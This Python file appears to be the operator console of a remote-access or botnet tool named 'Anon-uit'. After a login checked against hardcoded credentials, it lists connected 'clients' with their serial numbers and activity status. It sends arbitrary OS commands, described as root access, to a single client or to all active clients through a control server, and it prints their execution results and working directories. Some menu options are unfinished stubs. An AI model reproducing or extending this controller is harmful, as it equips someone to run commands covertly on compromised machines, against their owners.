import requests
from threading import Thread
import time
import json
import os
from datetime import datetime

endpoint_1 = 'http://127.0.0.1:8000/'
endpoint_2 = 'https://example.com/'



def login():
    name = 'MASTER'
    uid = 'helloworld'
    content = {'name': name, 'uid': uid}
    login = requests.post(f'{endpoint_1}login', json=content)
    login = dict(login.json())
    print(login)

def menu():
    try:
        print('')
        print('')
        print('-------------------------ANON MASTER MENU---------------------------------')
        print('')
        print('Get all clients: --clients')
        print('Open command line for client root access control: --cmd line')
        print('Open message line for client script execution: --script exec')
        print('Open message line for client messaging: --msg client')
        print('To quit: --quit')
        print('')
        print('      -------------------------END----------------------------------')
        print('')
        option = 1
        while option != '--quit':
            option = input(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/Enter option: ')
            if option == "--clients":
                view_clients()
            elif option == "--cmd line":
                os_command()
            elif option == "--script exec":
                pass
            elif option == "--msg client":
                pass
            else:
                print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/ERROR!: {option} command invalid.')
        print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Logging out...')
        login()
        access()
    except Exception as e:
        print(e)
        menu()


def os_command():
    try:
        print('Anon-uit command line [Version 0.0.1]/INFO: Starting root command access...')
        print('')
        print('')
        print('-------------------------ANON CLIENT ROOT ACCESS MENU---------------------------------')
        print('')
        print('Get all clients: --clients')
        print('View all possible commands for clients: --list commands')
        print('View special commands for clients: --list --s commands')
        print('Execute command for single client: --exec ?[COMMAND] #[CLIENT SERIAL NUMBER]!')
        print('Execute command for all active clients: --active --exec ?[COMMAND] #')
        print('Execute special command for single client: --exec --s ?[COMMAND] #[CLIENT SERIAL NUMBER]!')
        print('Execute special command for all active clients: --active --s --exec ?[COMMAND]')
        print('To quit to menu: --quit')
        print('')
        print('                -------------------------END----------------------------------')
        print('')
        entry = 1
        while entry != '--quit':
            entry = input(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/Enter command: ')
            entry = parse_command(entry)
            print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Variables found: {entry}')
            if entry == "--clients":
                view_clients()
            elif entry == "--list commands":
                pass
            elif entry == "--list --s commands":
                pass
            elif len(entry) == 2:
                print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Initiating execution...')
                send_command(entry[0], entry[1])
            elif len(entry) == 3:
                print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO:Initiating execution...')
                special_command(entry[0], entry[1])
            else:
                print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/ERROR!: {entry} command invalid.')
        print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Exiting to menu...')
        menu()

    except Exception as e:
        print(e)
        menu()


def parse_command(command):
    try:
        print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Evaluating {command}...')
        if command == '--clients':
            return command
        if command == '--list --s commands':
            return command
        if command == '--list commands':
            return command

        elif '--exec' in command:
            print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Finding variables...')
            s = command.find('?') + 1
            f = command.find('#') - 1
            ignite = command[s:f]
            sn = 0
            if '!' in command:
                s = command.find('#') + 1
                f = command.find('!')
                sn = command[s:f]
            if '--s' in command:
                if sn == 0:
                    result = [ignite, 'active', 's']
                    return result
                else:
                    result = [ignite, sn, 's']
                    return result
            if '--active' in command:
                result = [ignite, 'active']
                return result
            result = [ignite, sn]
            return result
    except Exception as e:
        print(e)
        menu()


def special_command(command, target):

    send_command(command, target)


def send_command(command, target):

    try:
        if target == 'active':
            print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Starting data transfer to all active clients...')
            endpoint = f'{endpoint_1}send_command'
            content = {"command": command, 'target': target}
            print(content)
            sender = requests.post(endpoint, json=content)
            sender = sender.json()
            print(sender)
            print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Command sent successfully.')
            print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Awaiting response from {sender}...')
            os_command()
        else:
            print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Retreving client UID for {target}...')
            endpoint = f'{endpoint_1}get_uid'
            content = {'target': target}
            sender = requests.post(endpoint, json=content)
            data = dict(sender.json())
            print(data)
            if data['uid'] == 0:
                print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/ERROR!: Client UID for {target} not found.')
                os_command()
            else:
                target = data['uid']
                print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Client UID: {target} found.')
                print(
                    f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Starting data transfer to {target}...')
                endpoint = f'{endpoint_1}send_command'
                content = {"command": command, 'target': target}
                print(content)
                sender = requests.post(endpoint, json=content)
                sender = sender.json()
                print(sender)
                print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Command sent successfully.')
                print(
                    f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Awaiting response from {sender}...')
                os_command()
    except Exception as e:
        print(e)
        menu()


def view_clients():
    try:
        clients = requests.get(f'{endpoint_1}get_clients')
        clients = dict(clients.json())
        clients = clients['clients']
        print('Anon-uit command line [Version 0.0.1]/INFO: Getting all clients...')
        print('')
        print('')
        print(
            '-----------------------------------------ALL CLIENTS--------------------------------------------------------')
        print('')
        for c in clients:
            uid = c['uid']
            name = c['name']
            last_seen = c['last_seen']
            active = c['active']
            serial_num = c['serial_num']
            print(
                '--------------------------------------------------------------------------------------------------------')
            print(f'NAME: {name}| UID: {uid}| LAST-SEEN: {last_seen}| ACTIVE: {active}| SERIAL NUMBER: {serial_num}')
        print('')
        print('\\-----------------------------------------END--------------------------------------------------------')
        print('')
    except Exception as e:
        print(e)
        menu()

def message():
    while True:
        content = input('Anon-uit command line [Version 0.0.1]/Enter message: ')
        content = {"message": content}
        sender = requests.post(endpoint_1, json=content)
        print(sender.json())


def receiver():
    print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Starting receiver...')
    while True:
        try:
            message = requests.get(f'{endpoint_1}command_response')
            message = dict(message.json())
            print(message)

            if message['new']:
                for r in message['response']:
                    sender = r['client']
                    message = r['response']
                    receipt = r['time_received']
                    dur = r['exec_duration']
                    wd = r['directory']

                    print('')
                    print('')
                    print('-------------------------RECEIVED-RESPONSE---------------------------------')
                    print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: CLIENT UID: {sender}| '
                          f'CLIENT SIDE TIME OF RECEIPT: {receipt}| EXECUTION DURATION: {dur}| WORKING DIRECTORY: {wd}')
                    print('-------------------------RECEIVED-DATA---------------------------------')
                    print(message)
                    print('-----------------------------END-RESPONSE---------------------------------')
                    print('')
                    print('')
        except Exception as e:
            print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/ERROR!: Error encountered while trying to '
                  f'receive command response.| MESSAGE: {str(e)}')




def access():
    a = 'aaaa'
    b = '1111'
    print('')
    print('')
    print('-------------------------ADMINISTRATOR LOGIN---------------------------------')
    print('                  Anon-uit command line [Version 0.0.1]')
    username = input(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/Enter Username: ')
    password = input(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/Enter Password: ')
    print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/Logging in....: ')
    if username == a and password == b:
        print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/INFO: Access granted!')
        listener = Thread(target=receiver)
        listener.start()
        menu()
    else:
        print(f'Anon-uit command line [Version 0.0.1][{datetime.now()}]/ERROR!: Access denied!')
        access()


access()
